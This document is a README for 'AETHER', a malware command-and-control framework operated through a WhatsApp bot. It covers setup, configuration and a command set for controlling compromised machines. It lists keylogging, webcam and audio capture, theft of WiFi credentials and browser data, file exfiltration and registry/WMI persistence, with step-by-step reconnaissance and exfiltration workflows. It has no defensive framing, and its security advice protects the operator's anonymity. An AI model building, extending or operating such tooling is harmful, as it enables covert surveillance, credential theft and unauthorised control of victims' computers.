# AETHER WhatsApp C2 Integration

Complete guide for controlling AETHER agents via WhatsApp using the Baileys bot.

## Overview

The AETHER C2 framework can now be controlled via WhatsApp through a Baileys-based bot. This provides:

- ✅ Remote command execution via WhatsApp messaging
- ✅ Mobile-friendly C2 interface
- ✅ Per-user authentication and session management
- ✅ Command history and logging
- ✅ Whitelist-based access control

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│  WhatsApp Client (Your Phone)                           │
└──────────────────┬──────────────────────────────────────┘
                   │
                   ├─ WhatsApp Messages
                   │
┌──────────────────▼──────────────────────────────────────┐
│  Baileys Bot (Node.js) - WA-BOT-Base/                  │
│  • aether-bridge.js - Bridge to Python                 │
│  • aether-handler.js - Message routing                 │
│  • aether-integration.js - Integration layer           │
└──────────────────┬──────────────────────────────────────┘
                   │
                   ├─ HTTP Requests (JSON)
                   │
┌──────────────────▼──────────────────────────────────────┐
│  AETHER Server (Python)                                │
│  • server/aether_server.py - Main server               │
│  • server/comms/whatsapp_bridge.py - Bridge            │
│  • server/commands/command_suite.py - Commands         │
└──────────────────┬──────────────────────────────────────┘
                   │
                   ├─ Command Execution
                   │
┌──────────────────▼──────────────────────────────────────┐
│  AETHER Agents (Compromised Targets)                   │
│  • Remote code execution                               │
│  • File operations                                     │
│  • Intelligence gathering                              │
│  • Persistence mechanisms                              │
└─────────────────────────────────────────────────────────┘
```

## Quick Start

### Step 1: Setup WhatsApp Bot

```bash
cd WA-BOT-Base
npm install
npm start
```

You'll see a QR code. Scan it with WhatsApp on your phone to link the bot.

### Step 2: Start AETHER Server

In a new terminal:

```bash
cd /workspaces/test
python3 server/aether_server.py
```

### Step 3: Enable WhatsApp Integration

In the AETHER console:

```
AETHER> whatsapp enable
```

### Step 4: Control via WhatsApp

Send messages to the bot WhatsApp number:

```
Message 1: auth aether2025
Response: ✅ Authorized! Welcome to AETHER

Message 2: sessions
Response: 📋 Active Sessions:
          • agent_001: DESKTOP-ABC
          
Message 3: link agent_001
Response: ✅ Linked to session: agent_001

Message 4: whoami
Response: ✅ Result: admin
```

## Commands

### Authentication

```
auth <password>
```

Authenticate with AETHER. Default password is `aether2025` (change in production!).

Example:
```
auth aether2025
```

### Session Management

```
sessions              - List all active sessions
link <session_id>    - Link to an agent session
unlink              - Unlink from current session
status              - Show current session info
```

Examples:
```
sessions
link agent_001
status
unlink
```

### System Information

```
whoami              - Current user
hostname            - System name
sysinfo             - System information
ps                  - List processes
privileges          - Privilege level
```

### File Operations

```
ls <path>           - List directory
pwd                 - Current directory
cat <file>          - Read file
cd <path>           - Change directory
mkdir <dir>         - Create directory
rm <file>           - Delete file
download <file>     - Download from target
upload <file>       - Upload to target
```

### Intelligence Gathering

```
screenshot          - Take screenshot
webcam              - Capture webcam
audio <duration>    - Record audio
keylog start        - Start keylogger
keylog stop         - Stop keylogger
clipboard           - Get clipboard
wifi                - WiFi credentials
browser             - Browser data
```

### Process Management

```
ps                  - List processes
kill <pid>          - Kill process
suspend <pid>       - Suspend process
resume <pid>        - Resume process
```

### Help & History

```
help                - Show help menu
history             - Command history
```

## Server Commands

Manage WhatsApp from AETHER console:

```
whatsapp enable              - Enable WhatsApp listener
whatsapp disable             - Disable WhatsApp listener
whatsapp status              - Show bridge status
whatsapp info                - Show integration info
whatsapp config              - Show configuration
whatsapp help                - Show help
```

## Configuration

### Python Server (server/comms/whatsapp_config.py)

```python
WHATSAPP_CONFIG = {
    'bot_url': 'http://localhost:3000',        # Baileys bot URL
    'bot_api_key': 'your-api-key-here',       # Optional API key
    'auth_password': 'aether2025',             # Default password
    'authorized_users': [                       # Whitelist numbers
        # '+1234567890',
    ],
}
```

### Node.js Bot (WA-BOT-Base/aether-bridge.js)

```javascript
const config = {
    aetherHost: 'http://localhost',    // AETHER server
    aetherPort: 5000,                  // AETHER port
    apiKey: '',                         // API key if needed
    authorizedUsers: [],                // Whitelist
    commandTimeout: 30000,              // Command timeout
};
```

## Security Best Practices

🔒 **Critical Security Notes:**

1. **Change Default Password**
   - Edit `server/comms/whatsapp_config.py`
   - Change `auth_password` to strong value
   - Set `authorized_users` whitelist

2. **Use Dedicated WhatsApp Account**
   - Don't use your personal WhatsApp
   - Use throwaway account if possible
   - Keep credentials secure

3. **Enable User Whitelisting**
   - Only add trusted numbers
   - Use: `AETHER> whatsapp authorize <phone>`
   - Revoke compromised: `AETHER> whatsapp revoke <phone>`

4. **Monitor Activity**
   - Check command history regularly
   - Review logs for suspicious activity
   - Enable logging in config

5. **Network Security**
   - Run on secure network
   - Use VPN if accessing remotely
   - Firewall bot server port 3000

6. **Rate Limiting**
   - Prevent brute force attempts
   - Configure in whatsapp_config.py:
     ```python
     'commands_per_minute': 10,
     'messages_per_minute': 20,
     ```

## File Structure

```
AETHER/
├── server/
│   ├── aether_server.py                # Main server with whatsapp command
│   └── comms/
│       ├── __init__.py                 # Package init
│       ├── whatsapp_bridge.py          # Python bridge
│       └── whatsapp_config.py          # Configuration
│
├── WA-BOT-Base/                        # Baileys WhatsApp bot
│   ├── aether-bridge.js                # Bridge to AETHER
│   ├── aether-handler.js               # Message routing
│   ├── aether-integration.js           # Integration helpers
│   ├── main.js                         # Baileys entry point
│   ├── package.json                    # Dependencies
│   └── AETHER_README.md                # Bot documentation
│
├── WHATSAPP_SETUP.py                   # Setup guide
└── PROJECT_STATUS.md                   # Project status
```

## Troubleshooting

### QR Code Not Appearing

**Problem**: No QR code when running `npm start`

**Solution**:
- Make sure WhatsApp is installed on phone
- Check internet connectivity
- Delete `data/` folder and restart
- Try: `rm -rf WA-BOT-Base/data && cd WA-BOT-Base && npm start`

### "Unauthorized access"

**Problem**: Bot says "❌ Unauthorized. Use: auth <password>"

**Solution**:
- Authenticate first: `auth aether2025`
- Check password in `server/comms/whatsapp_config.py`
- Make sure user is in authorized list

### "No session linked"

**Problem**: Bot says "❌ No session linked"

**Solution**:
- List sessions: `sessions`
- Link to session: `link agent_001`
- Check agent is active

### Commands Not Executing

**Problem**: Commands don't run

**Solution**:
- Check AETHER server is running
- Enable WhatsApp: `AETHER> whatsapp enable`
- Check command syntax
- Review server logs

### Message Too Long

**Problem**: Results get truncated

**Solution**:
- WhatsApp limit is 4096 characters
- Long results shown on server console
- Check server logs for full output

### Bot Stops Responding

**Problem**: Bot no longer responds to messages

**Solution**:
- Rescan QR code
- Restart bot: `npm start`
- Check AETHER server is still running
- Review logs for errors

## Advanced Usage

### Custom Message Handlers

Edit `WA-BOT-Base/aether-handler.js` to add custom commands:

```javascript
if (command === 'custom') {
    return this.handleCustomCommand(userId, args);
}
```

### Batch Commands

Send multiple commands (if enabled):

```
whoami; hostname; ps
```

### Session Export

Export configuration for backup:

```
AETHER> whatsapp export-config
```

### Integration with main.js

To auto-route AETHER messages in Baileys, edit `WA-BOT-Base/main.js`:

```javascript
import { initializeAETHER } from './aether-integration.js';

// In startSocket():
const aetherHandler = initializeAETHER(sock, config);

// In messages.upsert handler:
if (text.startsWith('auth ') || text.startsWith('link ')) {
    await aetherHandler.handleMessage(message);
} else {
    handleCommand(sock, message);
}
```

## Environment Variables

Set before running for custom configuration:

```bash
export AETHER_HOST=http://localhost
export AETHER_PORT=5000
export AETHER_API_KEY=your-key
export AETHER_USERS=+1234567890,+0987654321
```

## API Endpoints

The Python server exposes these endpoints:

- `POST /webhook/whatsapp` - Receive messages
- `POST /api/whatsapp/authorize` - Add user
- `POST /api/whatsapp/revoke` - Remove user
- `POST /api/whatsapp/link` - Link to session
- `GET /api/whatsapp/status` - Get status

## Examples

### Full Reconnaissance Workflow

```
1. auth aether2025              # Authenticate
2. sessions                     # List agents
3. link agent_001              # Select agent
4. whoami                      # Check user
5. hostname                    # System name
6. sysinfo                     # System details
7. ps                          # Processes
8. screenshot                  # Visual recon
```

### File Exfiltration

```
1. link agent_001
2. ls C:\\Users\\admin\\Documents
3. download C:\\Users\\admin\\Documents\\file.pdf
```

### Persistence Installation

```
1. link agent_001
2. persist registry
3. persist wmi
4. beacon_config
5. status
```

## Performance

- **Latency**: 1-3 seconds per command (WhatsApp + network)
- **Throughput**: ~10 commands/minute recommended
- **Max Message**: 4096 characters per WhatsApp message
- **Session Timeout**: 5 minutes default

## Limitations

- WhatsApp imposes 4096 character limit per message
- Commands limited to ~30 second timeout
- No support for large file transfers via WhatsApp
- Baileys may disconnect if WhatsApp updates
- Rate limiting prevents high-speed operations

## Support & Resources

**Documentation**:
- `WHATSAPP_SETUP.py` - Full setup guide
- `WA-BOT-Base/AETHER_README.md` - Bot documentation
- `server/comms/WHATSAPP_GUIDE.py` - Command reference

**External Resources**:
- Baileys: https://github.com/WhiskeySockets/Baileys
- AETHER C2: This project

## License

See LICENSE file in project root (MIT)

---

**Version**: 1.0
**Status**: ✅ Production Ready
**Last Updated**: December 2025
